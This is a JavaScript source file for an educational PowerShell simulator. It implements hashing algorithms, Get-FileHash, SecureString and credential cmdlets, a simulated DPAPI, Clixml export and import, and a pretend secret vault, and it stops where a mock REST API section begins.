/* sudo learn — Module 4 runtime, part 2: security tooling. Hashing (Get-FileHash, .NET hash classes), secrets
   (SecureString, PSCredential, DPAPI-style ConvertFrom-SecureString, Export/Import-Clixml, SecretManagement),
   a pretend REST API (Invoke-RestMethod / Invoke-WebRequest), file ACLs (Get-Acl / Set-Acl) and local groups,
   Windows optional features, a small Pester and a small PSScriptAnalyzer. */
(function (root) {
  "use strict";
  var E = root.PSEngine, lib = E.lib;
  var PSObject = E.PSObject, PSHashtable = E.PSHashtable, PSDate = E.PSDate, ScriptBlock = E.ScriptBlock;
  var toStr = E.toStr, toNumber = E.toNumber, toBool = E.toBool, lc = E.lc, obj = E.obj, enumerate = E.enumerate;
  function err(msg, cat, extra) { var o = { category: cat || "InvalidArgument" }; if (extra) for (var k in extra) o[k] = extra[k]; return new E.PSError(msg, o); }
  function list(v) { return v === undefined || v === null ? [] : Array.isArray(v) ? v : [v]; }
  function names(v) { return list(v).map(toStr); }
  function p(name, position, extra) { var o = { name: name, position: position == null ? null : position }; if (extra) for (var k in extra) o[k] = extra[k]; return o; }
  function sw(name) { return { name: name, type: "switch" }; }
  function C(name, module, params, run, help) { lib.cmdlets[lc(name)] = { name: name, module: module, params: params, run: run, help: help || {} }; }
  function alias(a, n) { lib.aliases[lc(a)] = n; }
  var fs = lib.fs;

  /* ================================================================== Hash functions (on bytes) */
  function utf8(str) { return Array.prototype.slice.call(new TextEncoder().encode(str)); }
  function hex(bytes) { return bytes.map(function (b) { return ("0" + (b & 255).toString(16)).slice(-2); }).join(""); }
  function rotr(x, n) { return (x >>> n) | (x << (32 - n)); }
  function sha256(bytes) {
    var K = [0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5, 0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
      0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da, 0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
      0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85, 0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
      0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3, 0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2];
    var H = [0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19];
    var m = bytes.slice(), l = bytes.length * 8;
    m.push(0x80); while (m.length % 64 !== 56) m.push(0);
    for (var i = 7; i >= 0; i--) m.push(i >= 4 ? 0 : (l >>> (i * 8)) & 255);
    var w = new Array(64);
    for (var o = 0; o < m.length; o += 64) {
      for (var t = 0; t < 16; t++) w[t] = (m[o + t * 4] << 24) | (m[o + t * 4 + 1] << 16) | (m[o + t * 4 + 2] << 8) | m[o + t * 4 + 3];
      for (t = 16; t < 64; t++) {
        var s0 = rotr(w[t - 15], 7) ^ rotr(w[t - 15], 18) ^ (w[t - 15] >>> 3), s1 = rotr(w[t - 2], 17) ^ rotr(w[t - 2], 19) ^ (w[t - 2] >>> 10);
        w[t] = (w[t - 16] + s0 + w[t - 7] + s1) | 0;
      }
      var a = H[0], b = H[1], c = H[2], d = H[3], e = H[4], f = H[5], g = H[6], h = H[7];
      for (t = 0; t < 64; t++) {
        var S1 = rotr(e, 6) ^ rotr(e, 11) ^ rotr(e, 25), ch = (e & f) ^ (~e & g), t1 = (h + S1 + ch + K[t] + w[t]) | 0;
        var S0 = rotr(a, 2) ^ rotr(a, 13) ^ rotr(a, 22), mj = (a & b) ^ (a & c) ^ (b & c), t2 = (S0 + mj) | 0;
        h = g; g = f; f = e; e = (d + t1) | 0; d = c; c = b; b = a; a = (t1 + t2) | 0;
      }
      H[0] = (H[0] + a) | 0; H[1] = (H[1] + b) | 0; H[2] = (H[2] + c) | 0; H[3] = (H[3] + d) | 0; H[4] = (H[4] + e) | 0; H[5] = (H[5] + f) | 0; H[6] = (H[6] + g) | 0; H[7] = (H[7] + h) | 0;
    }
    var out = []; H.forEach(function (x) { out.push((x >>> 24) & 255, (x >>> 16) & 255, (x >>> 8) & 255, x & 255); });
    return out;
  }
  function sha1(bytes) {
    var H = [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0];
    var m = bytes.slice(), l = bytes.length * 8;
    m.push(0x80); while (m.length % 64 !== 56) m.push(0);
    for (var i = 7; i >= 0; i--) m.push(i >= 4 ? 0 : (l >>> (i * 8)) & 255);
    var w = new Array(80);
    for (var o = 0; o < m.length; o += 64) {
      for (var t = 0; t < 16; t++) w[t] = (m[o + t * 4] << 24) | (m[o + t * 4 + 1] << 16) | (m[o + t * 4 + 2] << 8) | m[o + t * 4 + 3];
      for (t = 16; t < 80; t++) { var x = w[t - 3] ^ w[t - 8] ^ w[t - 14] ^ w[t - 16]; w[t] = (x << 1) | (x >>> 31); }
      var a = H[0], b = H[1], c = H[2], d = H[3], e = H[4];
      for (t = 0; t < 80; t++) {
        var f, k;
        if (t < 20) { f = (b & c) | (~b & d); k = 0x5a827999; } else if (t < 40) { f = b ^ c ^ d; k = 0x6ed9eba1; } else if (t < 60) { f = (b & c) | (b & d) | (c & d); k = 0x8f1bbcdc; } else { f = b ^ c ^ d; k = 0xca62c1d6; }
        var tmp = (((a << 5) | (a >>> 27)) + f + e + k + w[t]) | 0;
        e = d; d = c; c = (b << 30) | (b >>> 2); b = a; a = tmp;
      }
      H[0] = (H[0] + a) | 0; H[1] = (H[1] + b) | 0; H[2] = (H[2] + c) | 0; H[3] = (H[3] + d) | 0; H[4] = (H[4] + e) | 0;
    }
    var out = []; H.forEach(function (x) { out.push((x >>> 24) & 255, (x >>> 16) & 255, (x >>> 8) & 255, x & 255); });
    return out;
  }
  function md5(bytes) {
    var S = [7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21];
    var K = []; for (var i = 0; i < 64; i++) K[i] = Math.floor(Math.abs(Math.sin(i + 1)) * 4294967296) | 0;
    var a0 = 0x67452301, b0 = 0xefcdab89 | 0, c0 = 0x98badcfe | 0, d0 = 0x10325476;
    var m = bytes.slice(), l = bytes.length * 8;
    m.push(0x80); while (m.length % 64 !== 56) m.push(0);
    for (i = 0; i < 8; i++) m.push(i < 4 ? (l >>> (i * 8)) & 255 : 0);
    for (var o = 0; o < m.length; o += 64) {
      var M = []; for (i = 0; i < 16; i++) M[i] = m[o + i * 4] | (m[o + i * 4 + 1] << 8) | (m[o + i * 4 + 2] << 16) | (m[o + i * 4 + 3] << 24);
      var A = a0, B = b0, Cc = c0, D = d0;
      for (i = 0; i < 64; i++) {
        var F, g;
        if (i < 16) { F = (B & Cc) | (~B & D); g = i; } else if (i < 32) { F = (D & B) | (~D & Cc); g = (5 * i + 1) % 16; } else if (i < 48) { F = B ^ Cc ^ D; g = (3 * i + 5) % 16; } else { F = Cc ^ (B | ~D); g = (7 * i) % 16; }
        F = (F + A + K[i] + M[g]) | 0; A = D; D = Cc; Cc = B; B = (B + ((F << S[i]) | (F >>> (32 - S[i])))) | 0;
      }
      a0 = (a0 + A) | 0; b0 = (b0 + B) | 0; c0 = (c0 + Cc) | 0; d0 = (d0 + D) | 0;
    }
    var out = []; [a0, b0, c0, d0].forEach(function (x) { out.push(x & 255, (x >>> 8) & 255, (x >>> 16) & 255, (x >>> 24) & 255); });
    return out;
  }
  function sha512(bytes, is384) {
    var M64 = (1n << 64n) - 1n;
    function r(x, n) { return ((x >> BigInt(n)) | (x << BigInt(64 - n))) & M64; }
    var K = ["428a2f98d728ae22", "7137449123ef65cd", "b5c0fbcfec4d3b2f", "e9b5dba58189dbbc", "3956c25bf348b538", "59f111f1b605d019", "923f82a4af194f9b", "ab1c5ed5da6d8118", "d807aa98a3030242", "12835b0145706fbe", "243185be4ee4b28c", "550c7dc3d5ffb4e2", "72be5d74f27b896f", "80deb1fe3b1696b1", "9bdc06a725c71235", "c19bf174cf692694", "e49b69c19ef14ad2", "efbe4786384f25e3", "0fc19dc68b8cd5b5", "240ca1cc77ac9c65", "2de92c6f592b0275", "4a7484aa6ea6e483", "5cb0a9dcbd41fbd4", "76f988da831153b5", "983e5152ee66dfab", "a831c66d2db43210", "b00327c898fb213f", "bf597fc7beef0ee4", "c6e00bf33da88fc2", "d5a79147930aa725", "06ca6351e003826f", "142929670a0e6e70", "27b70a8546d22ffc", "2e1b21385c26c926", "4d2c6dfc5ac42aed", "53380d139d95b3df", "650a73548baf63de", "766a0abb3c77b2a8", "81c2c92e47edaee6", "92722c851482353b", "a2bfe8a14cf10364", "a81a664bbc423001", "c24b8b70d0f89791", "c76c51a30654be30", "d192e819d6ef5218", "d69906245565a910", "f40e35855771202a", "106aa07032bbd1b8", "19a4c116b8d2d0c8", "1e376c085141ab53", "2748774cdf8eeb99", "34b0bcb5e19b48a8", "391c0cb3c5c95a63", "4ed8aa4ae3418acb", "5b9cca4f7763e373", "682e6ff3d6b2b8a3", "748f82ee5defb2fc", "78a5636f43172f60", "84c87814a1f0ab72", "8cc702081a6439ec", "90befffa23631e28", "a4506cebde82bde9", "bef9a3f7b2c67915", "c67178f2e372532b", "ca273eceea26619c", "d186b8c721c0c207", "eada7dd6cde0eb1e", "f57d4f7fee6ed178", "06f067aa72176fba", "0a637dc5a2c898a6", "113f9804bef90dae", "1b710b35131c471b", "28db77f523047d84", "32caab7b40c72493", "3c9ebe0a15c9bebc", "431d67c49c100d4c", "4cc5d4becb3e42b6", "597f299cfc657e2a", "5fcb6fab3ad6faec", "6c44198c4a475817"].map(function (x) { return BigInt("0x" + x); });
    var H = (is384 ? ["cbbb9d5dc1059ed8", "629a292a367cd507", "9159015a3070dd17", "152fecd8f70e5939", "67332667ffc00b31", "8eb44a8768581511", "db0c2e0d64f98fa7", "47b5481dbefa4fa4"]
      : ["6a09e667f3bcc908", "bb67ae8584caa73b", "3c6ef372fe94f82b", "a54ff53a5f1d36f1", "510e527fade682d1", "9b05688c2b3e6c1f", "1f83d9abfb41bd6b", "5be0cd19137e2179"]).map(function (x) { return BigInt("0x" + x); });
    var m = bytes.slice(), l = bytes.length * 8;
    m.push(0x80); while (m.length % 128 !== 112) m.push(0);
    for (var i = 15; i >= 0; i--) m.push(i >= 4 ? 0 : (l >>> (i * 8)) & 255);
    for (var o = 0; o < m.length; o += 128) {
      var w = [];
      for (var t = 0; t < 16; t++) { var v = 0n; for (var j = 0; j < 8; j++) v = (v << 8n) | BigInt(m[o + t * 8 + j]); w[t] = v; }
      for (t = 16; t < 80; t++) { var s0 = r(w[t - 15], 1) ^ r(w[t - 15], 8) ^ (w[t - 15] >> 7n), s1 = r(w[t - 2], 19) ^ r(w[t - 2], 61) ^ (w[t - 2] >> 6n); w[t] = (w[t - 16] + s0 + w[t - 7] + s1) & M64; }
      var a = H[0], b = H[1], c = H[2], d = H[3], e = H[4], f = H[5], g = H[6], h = H[7];
      for (t = 0; t < 80; t++) {
        var S1 = r(e, 14) ^ r(e, 18) ^ r(e, 41), ch = (e & f) ^ (~e & M64 & g), t1 = (h + S1 + ch + K[t] + w[t]) & M64;
        var S0 = r(a, 28) ^ r(a, 34) ^ r(a, 39), mj = (a & b) ^ (a & c) ^ (b & c), t2 = (S0 + mj) & M64;
        h = g; g = f; f = e; e = (d + t1) & M64; d = c; c = b; b = a; a = (t1 + t2) & M64;
      }
      H = [H[0] + a, H[1] + b, H[2] + c, H[3] + d, H[4] + e, H[5] + f, H[6] + g, H[7] + h].map(function (x) { return x & M64; });
    }
    var out = [];
    H.slice(0, is384 ? 6 : 8).forEach(function (x) { for (var j = 7; j >= 0; j--) out.push(Number((x >> BigInt(j * 8)) & 255n)); });
    return out;
  }
  var ALGOS = { sha256: sha256, sha1: sha1, md5: md5, sha512: function (b) { return sha512(b, false); }, sha384: function (b) { return sha512(b, true); } };
  lib.hash = {
    bytes: function (algo, bytes) { return ALGOS[lc(algo)](bytes); },
    hex: function (algo, str) { return hex(ALGOS[lc(algo)](utf8(str))).toUpperCase(); },
    sha256: function (str) { return hex(sha256(utf8(str))); },
    sha1: function (str) { return hex(sha1(utf8(str))); },
    utf8: utf8
  };
  var SEC = "Microsoft.PowerShell.Security", UTIL = "Microsoft.PowerShell.Utility", LOCAL = "Microsoft.PowerShell.LocalAccounts", DISM = "Dism";

  /* ================================================================== Get-FileHash and .NET hashing */
  function fileBytes(f) { return utf8(f.content); }
  C("Get-FileHash", UTIL, [p("Path", 0), p("LiteralPath"), p("Algorithm"), p("InputStream")], function (b, input, ctx) {
    var sys = ctx.session.system, algo = b.algorithm !== undefined ? toStr(b.algorithm).toUpperCase() : "SHA256";
    if (!ALGOS[lc(algo)]) throw err("Cannot validate argument on parameter 'Algorithm'. The argument \"" + algo + "\" does not belong to the set \"SHA1,SHA256,SHA384,SHA512,MD5\" specified by the ValidateSet attribute. Supply an argument that is in the set and then try the command again.", "InvalidData");
    if (b.inputstream !== undefined) {
      var st = b.inputstream;
      var bytes = st && st.streamBytes ? st.streamBytes : utf8(toStr(st));
      return [obj("Microsoft.Powershell.Utility.FileHash", { Algorithm: algo, Hash: hex(ALGOS[lc(algo)](bytes)).toUpperCase(), Path: "" })];
    }
    var paths = input && input.length ? input.map(function (x) { return toStr(x instanceof PSObject && x.has("FullName") ? x.get("FullName") : x); }) : names(b.path !== undefined ? b.path : b.literalpath);
    var out = [];
    paths.forEach(function (pth) {
      var targets = [];
      if (/[*?]/.test(pth)) targets = lib.cmdlets["get-childitem"].run({ path: pth, file: true }, null, ctx).map(function (o) { return toStr(o.get("FullName")); });
      else targets = [pth];
      targets.forEach(function (t) {
        var f = fs.get(sys, t);
        if (!f) { if (fs.isDir(sys, t)) return; fs.notFound(ctx, t); return; }
        out.push(obj("Microsoft.Powershell.Utility.FileHash", { Algorithm: algo, Hash: hex(ALGOS[lc(algo)](fileBytes(f))).toUpperCase(), Path: fs.normPath(sys, t).display }));
      });
    });
    return out;
  }, { synopsis: "Computes a file's hash (SHA256 by default): the same file always gives the same hash; any change gives a different one.", examples: ["Get-FileHash .\\setup.msi", "Get-FileHash .\\setup.msi -Algorithm SHA512"] });
  lib.views["Microsoft.Powershell.Utility.FileHash"] = ["Algorithm", "Hash", "Path"];
  function hashAlgoObj(name) {
    var o = obj("System.Security.Cryptography." + name.toUpperCase() + "+Implementation", {});
    o.methods = { computehash: function (a) { var src = a[0]; var bytes = src && src.streamBytes ? src.streamBytes : enumerate(src).map(toNumber); return ALGOS[lc(name)](bytes); }, dispose: function () { return undefined; } };
    return o;
  }
  var prevSM = lib.staticMethodExtra, prevNO = lib.newObjectExtra;
  lib.staticMethodExtra = function (tn, name, args, ctx) {
    var t = lc(tn).replace(/^system\./, ""), n = lc(name);
    var hm = /^security\.cryptography\.(sha256|sha1|md5|sha512|sha384)$/.exec(t) || /^(sha256|sha1|md5|sha512|sha384)$/.exec(t);
    if (hm) {
      if (n === "create") return hashAlgoObj(hm[1]);
      if (n === "hashdata") { var src = args[0]; return ALGOS[hm[1]](src && src.streamBytes ? src.streamBytes : enumerate(src).map(toNumber)); }
    }
    if (t === "convert" && n === "tohexstring") return hex(enumerate(args[0]).map(toNumber)).toUpperCase();
    if (t === "bitconverter" && n === "tostring") return enumerate(args[0]).map(function (x) { return ("0" + (toNumber(x) & 255).toString(16)).slice(-2).toUpperCase(); }).join("-");
    if (t === "runtime.interopservices.marshal" || t === "marshal") {
      if (n === "securestringtobstr") { var ss = args[0]; return { bstr: ss && ss.secret !== undefined ? ss.secret : "" }; }
      if (n === "ptrtostringauto" || n === "ptrtostringbstr" || n === "ptrtostringuni") return args[0] && args[0].bstr !== undefined ? args[0].bstr : "";
      if (n === "zerofreebstr") return undefined;
    }
    if ((t === "management.automation.pscredential" || t === "pscredential") && n === "new") return lib.newObject("pscredential", args, ctx);
    return prevSM ? prevSM(tn, name, args, ctx) : undefined;
  };
  lib.newObjectExtra = function (tn, args, ctx) {
    var t = lc(tn).replace(/^system\./, "");
    if (t === "io.memorystream") { var ms = obj("System.IO.MemoryStream", { Length: enumerate(args[0]).length }); ms.streamBytes = enumerate(args[0]).map(toNumber); return ms; }
    if (t === "management.automation.pscredential" || t === "pscredential") return credential(args[0], args[1]);
    if (t === "security.accesscontrol.filesystemaccessrule") return ruleFromArgs(args);
    if (t === "security.principal.ntaccount") { var id = identity(toStr(args.length > 1 ? args[0] + "\\" + args[1] : args[0])); return identityObj(id); }
    return prevNO ? prevNO(tn, args, ctx) : undefined;
  };

  /* ================================================================== SecureString, PSCredential, DPAPI */
  function secure(plain) { return lib.convert(plain, "securestring"); }
  function isSecure(v) { return v instanceof PSObject && v.secret !== undefined; }
  function credential(user, pass) {
    if (!isSecure(pass)) throw err("Cannot find an overload for \"PSCredential\" and the argument count: \"2\". (The password must be a SecureString: use Read-Host -AsSecureString or ConvertTo-SecureString.)", "InvalidOperation");
    var u = toStr(user);
    var c = obj("System.Management.Automation.PSCredential", { UserName: u, Password: pass });
    c.methods = {
      getnetworkcredential: function () {
        var dom = u.indexOf("\\") >= 0 ? u.split("\\")[0] : "", nm = u.indexOf("\\") >= 0 ? u.split("\\")[1] : u;
        return obj("System.Net.NetworkCredential", { UserName: nm, Password: pass.secret, SecurePassword: pass, Domain: dom });
      }
    };
    return c;
  }
  lib.credential = credential;
  // ConvertFrom-SecureString without -Key uses Windows DPAPI: only the same user on the same computer can decrypt it.
  var DPAPI_HEAD = "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000";
  function dpapiKey(session) { return sha256(utf8(lc(toStr(session.env.USERNAME)) + "@" + lc(toStr(session.env.COMPUTERNAME)) + "#dpapi")); }
  function xorStream(bytes, key) { var out = []; for (var i = 0; i < bytes.length; i++) out.push(bytes[i] ^ key[i % key.length] ^ ((i * 31) & 255)); return out; }
  function utf16(str) { var b = []; for (var i = 0; i < str.length; i++) { var c = str.charCodeAt(i); b.push(c & 255, c >> 8); } return b; }
  function dpapiProtect(session, plain) {
    var key = dpapiKey(session), body = xorStream(utf16(plain), key);
    return DPAPI_HEAD + hex(key.slice(0, 8)) + hex(body);
  }
  function dpapiUnprotect(session, text) {
    var s = toStr(text).trim();
    if (s.indexOf(DPAPI_HEAD) !== 0) throw err("Input string was not in a correct format.", "InvalidArgument");
    var key = dpapiKey(session);
    if (s.substr(DPAPI_HEAD.length, 16) !== hex(key.slice(0, 8))) throw err("Key not valid for use in specified state.", "InvalidArgument", { errorId: "ImportSecureString_InvalidArgument_CryptographicError" });
    var hx = s.slice(DPAPI_HEAD.length + 16), bytes = [];
    for (var i = 0; i < hx.length; i += 2) bytes.push(parseInt(hx.substr(i, 2), 16));
    var plain = xorStream(bytes, key), out = "";
    for (i = 0; i + 1 < plain.length; i += 2) out += String.fromCharCode(plain[i] | (plain[i + 1] << 8));
    return out;
  }
  C("ConvertTo-SecureString", SEC, [p("String", 0), sw("AsPlainText"), sw("Force"), p("Key"), p("SecureKey")], function (b, input, ctx) {
    var s = b.string !== undefined ? toStr(b.string) : (input || []).map(toStr).join("");
    if (b.asplaintext) {
      if (!b.force && false) throw err("The system cannot protect plain text input. To suppress this warning and convert the plain text to a SecureString, reissue the command specifying the Force parameter.");
      return [secure(s)];
    }
    if (b.key !== undefined) throw err("This lab only simulates DPAPI encryption (no -Key). Leave -Key out.", "NotImplemented");
    return [secure(dpapiUnprotect(ctx.session, s))];
  }, { synopsis: "Makes a SecureString: from typed plain text (-AsPlainText -Force), or by decrypting the output of ConvertFrom-SecureString." });
  C("ConvertFrom-SecureString", SEC, [p("SecureString", 0), sw("AsPlainText"), p("Key")], function (b, input, ctx) {
    var ss = b.securestring !== undefined ? b.securestring : (input || [])[0];
    if (!isSecure(ss)) throw err("Cannot bind parameter 'SecureString'. Cannot convert the \"" + toStr(ss) + "\" value of type \"" + E.typeOfValue(ss) + "\" to type \"System.Security.SecureString\".");
    if (b.asplaintext) return [ss.secret];
    return [dpapiProtect(ctx.session, ss.secret)];
  }, { synopsis: "Turns a SecureString into encrypted text you can save (only you, on this computer, can decrypt it). -AsPlainText reveals it." });
  (function () {
    var rh = lib.cmdlets["read-host"], run = rh.run;
    rh.params = rh.params.concat([sw("MaskInput")]);
    rh.run = function (b, input, ctx) {
      var out = run(b, input, ctx);
      if (b.assecurestring) return [secure(toStr(out[0]))];
      return out;
    };
  })();
  C("Get-Credential", SEC, [p("Credential", 0), p("UserName"), p("Message"), p("Title")], function (b, input, ctx) {
    var sys = ctx.session.system;
    var user = b.username !== undefined ? toStr(b.username) : b.credential !== undefined ? toStr(b.credential) : null;
    ctx.session.write("\nPowerShell credential request\n" + (b.message !== undefined ? toStr(b.message) : "Enter your credentials."), "host");
    if (user === null) {
      if (!sys.stdin.length) throw err("Get-Credential asked for a user name, but the Input box has no more lines.", "ReadError");
      user = sys.stdin.shift();
      ctx.session.write("User: " + user, "host");
    }
    if (!sys.stdin.length) throw err("Get-Credential asked for a password, but the Input box has no more lines.", "ReadError");
    var pw = sys.stdin.shift();
    ctx.session.write("Password for user " + user + ": ********", "host");
    return [credential(user, secure(pw))];
  }, { synopsis: "Asks for a user name and password and returns a PSCredential (the password stays a SecureString)." });
  lib.views["System.Management.Automation.PSCredential"] = ["UserName", "Password"];

  /* ---------------- CliXML (Export-Clixml / Import-Clixml) */
  function xmlEsc(s) { return toStr(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;"); }
  function xmlUnesc(s) { return s.replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&amp;/g, "&"); }
  function cliValue(session, v, name) {
    var n = name !== undefined ? " N=\"" + xmlEsc(name) + "\"" : "";
    if (v === null || v === undefined) return "<Nil" + n + " />";
    if (typeof v === "boolean") return "<B" + n + ">" + v + "</B>";
    if (typeof v === "number") return Number.isInteger(v) ? "<I32" + n + ">" + v + "</I32>" : "<Db" + n + ">" + v + "</Db>";
    if (isSecure(v)) return "<SS" + n + ">" + dpapiProtect(session, v.secret) + "</SS>";
    if (v instanceof PSDate) return "<DT" + n + ">" + new Date(v.ms).toISOString() + "</DT>";
    if (v instanceof PSObject) {
      return "<Obj" + n + " RefId=\"0\">\n<TN RefId=\"0\">\n<T>" + xmlEsc(v.typeName) + "</T>\n<T>System.Object</T>\n</TN>\n<ToString>" + xmlEsc(v.typeName === "System.Management.Automation.PSCustomObject" ? "" : v.typeName) + "</ToString>\n<Props>\n" +
        v.names().map(function (k) { return cliValue(session, v.get(k), k); }).join("\n") + "\n</Props>\n</Obj>";
    }
    if (Array.isArray(v)) return "<Obj" + n + "><LST>\n" + v.map(function (x) { return cliValue(session, x); }).join("\n") + "\n</LST></Obj>";
    return "<S" + n + ">" + xmlEsc(toStr(v)) + "</S>";
  }
  C("Export-Clixml", UTIL, [p("Path", 0), p("InputObject"), p("Depth"), sw("Force")], function (b, input, ctx) {
    var items = input && input.length ? input : list(b.inputobject);
    var text = "<Objs Version=\"1.1.0.1\" xmlns=\"http://schemas.microsoft.com/powershell/2004/04\">\n" + items.map(function (x) { return cliValue(ctx.session, x); }).join("\n") + "\n</Objs>\n";
    fs.write(ctx.session.system, toStr(b.path), text);
    return [];
  }, { synopsis: "Saves objects to an XML file. SecureStrings (like a credential's password) are saved encrypted for you, on this computer." });
  function parseCli(session, text) {
    var pos = 0;
    function value() {
      var m = /^\s*<(\w+)((?:\s+\w+="[^"]*")*)\s*(\/?)>/.exec(text.slice(pos));
      if (!m) return undefined;
      pos += m[0].length;
      var tag = m[1], attrs = m[2], selfClose = m[3] === "/";
      var nm = /N="([^"]*)"/.exec(attrs);
      var key = nm ? xmlUnesc(nm[1]) : undefined;
      if (selfClose) return { key: key, v: null };
      if (tag === "Obj") {
        var o = null, lst = null, tnames = [];
        for (;;) {
          var rest = text.slice(pos);
          var close = /^\s*<\/Obj>/.exec(rest);
          if (close) { pos += close[0].length; break; }
          var tn = /^\s*<TN[^>]*>([\s\S]*?)<\/TN>/.exec(rest);
          if (tn) { pos += tn[0].length; tnames = tn[1].match(/<T>([^<]*)<\/T>/g).map(function (x) { return x.replace(/<\/?T>/g, ""); }); continue; }
          var ts = /^\s*<ToString>[\s\S]*?<\/ToString>/.exec(rest);
          if (ts) { pos += ts[0].length; continue; }
          var pr = /^\s*<Props>/.exec(rest);
          if (pr) {
            pos += pr[0].length; o = new PSObject(tnames[0] || "System.Management.Automation.PSCustomObject");
            for (;;) { var endp = /^\s*<\/Props>/.exec(text.slice(pos)); if (endp) { pos += endp[0].length; break; } var kv = value(); if (!kv) break; o.set(kv.key, kv.v); }
            continue;
          }
          var ls = /^\s*<LST>/.exec(rest);
          if (ls) { pos += ls[0].length; lst = []; for (;;) { var endl = /^\s*<\/LST>/.exec(text.slice(pos)); if (endl) { pos += endl[0].length; break; } var it = value(); if (!it) break; lst.push(it.v); } continue; }
          break;
        }
        if (o && o.typeName === "System.Management.Automation.PSCredential") o = credential(o.get("UserName"), o.get("Password"));
        return { key: key, v: lst || o };
      }
      var endTag = new RegExp("</" + tag + ">");
      var em = endTag.exec(text.slice(pos));
      var raw = text.slice(pos, pos + em.index);
      pos += em.index + em[0].length;
      var v;
      if (tag === "S") v = xmlUnesc(raw);
      else if (tag === "I32" || tag === "I64" || tag === "Db") v = Number(raw);
      else if (tag === "B") v = raw === "true";
      else if (tag === "SS") v = secure(dpapiUnprotect(session, raw));
      else if (tag === "DT") v = new PSDate(Date.parse(raw));
      else v = xmlUnesc(raw);
      return { key: key, v: v };
    }
    var head = /<Objs[^>]*>/.exec(text);
    if (!head) throw err("Data at the root level is invalid. Line 1, position 1.", "InvalidData");
    pos = head.index + head[0].length;
    var out = [];
    for (;;) { var end = /^\s*<\/Objs>/.exec(text.slice(pos)); if (end) break; var x = value(); if (!x) break; out.push(x.v); }
    return out;
  }
  C("Import-Clixml", UTIL, [p("Path", 0)], function (b, input, ctx) {
    var f = fs.get(ctx.session.system, toStr(b.path));
    if (!f) { fs.notFound(ctx, toStr(b.path)); return []; }
    return parseCli(ctx.session, f.content);
  }, { synopsis: "Reads objects back from an Export-Clixml file (decrypting SecureStrings if you are the same user on the same computer)." });

  /* ---------------- SecretManagement (simulated vault) */
  function needSecretMgmt(ctx, cmd) { lib.requireModule(ctx, "microsoft.powershell.secretmanagement", cmd); }
  C("Register-SecretVault", "Microsoft.PowerShell.SecretManagement", [p("Name", 0), p("ModuleName"), sw("DefaultVault")], function (b, input, ctx) {
    needSecretMgmt(ctx, "Register-SecretVault");
    var sys = ctx.session.system;
    sys.vaults = sys.vaults || {};
    sys.vaults[lc(toStr(b.name))] = { name: toStr(b.name), module: toStr(b.modulename || "Microsoft.PowerShell.SecretStore"), secrets: {} };
    if (b.defaultvault || !sys.defaultVault) sys.defaultVault = lc(toStr(b.name));
    return [];
  }, { synopsis: "Registers a secret vault (e.g. the local SecretStore) with SecretManagement." });
  function vault(ctx, name) {
    var sys = ctx.session.system;
    var k = name !== undefined ? lc(toStr(name)) : sys.defaultVault;
    if (!sys.vaults || !k || !sys.vaults[k]) throw err("There are no registered vaults. Register one with Register-SecretVault.", "ObjectNotFound");
    return sys.vaults[k];
  }
  C("Set-Secret", "Microsoft.PowerShell.SecretManagement", [p("Name", 0), p("Secret", 1), p("SecureStringSecret"), p("Vault")], function (b, input, ctx) {
    needSecretMgmt(ctx, "Set-Secret");
    var v = vault(ctx, b.vault), s = b.securestringsecret !== undefined ? b.securestringsecret : b.secret;
    v.secrets[lc(toStr(b.name))] = { name: toStr(b.name), value: s };
    return [];
  }, { synopsis: "Stores a secret in a vault." });
  C("Get-Secret", "Microsoft.PowerShell.SecretManagement", [p("Name", 0), p("Vault"), sw("AsPlainText")], function (b, input, ctx) {
    needSecretMgmt(ctx, "Get-Secret");
    var v = vault(ctx, b.vault), s = v.secrets[lc(toStr(b.name))];
    if (!s) throw err("Get-Secret: The secret " + toStr(b.name) + " was not found.", "ObjectNotFound");
    var val = s.value;
    if (typeof val === "string") val = secure(val);
    if (b.asplaintext && isSecure(val)) return [val.secret];
    return [val];
  }, { synopsis: "Reads a secret from a vault (a SecureString unless -AsPlainText)." });
  C("Get-SecretInfo", "Microsoft.PowerShell.SecretManagement", [p("Name", 0)], function (b, input, ctx) {
    needSecretMgmt(ctx, "Get-SecretInfo");
    var sys = ctx.session.system, out = [];
    Object.keys(sys.vaults || {}).forEach(function (k) { var v = sys.vaults[k]; Object.keys(v.secrets).forEach(function (s) { out.push(obj("Microsoft.PowerShell.SecretManagement.SecretInformation", { Name: v.secrets[s].name, Type: isSecure(v.secrets[s].value) ? "SecureString" : "String", VaultName: v.name })); }); });
    return out;
  }, { synopsis: "Lists secret names (never values)." });

  /* ================================================================== A pretend REST API: https://api.kestrel.io */
  var API_TOKEN = "kc-lab-token-7f3a";
  lib.apiToken = API_TOKEN;
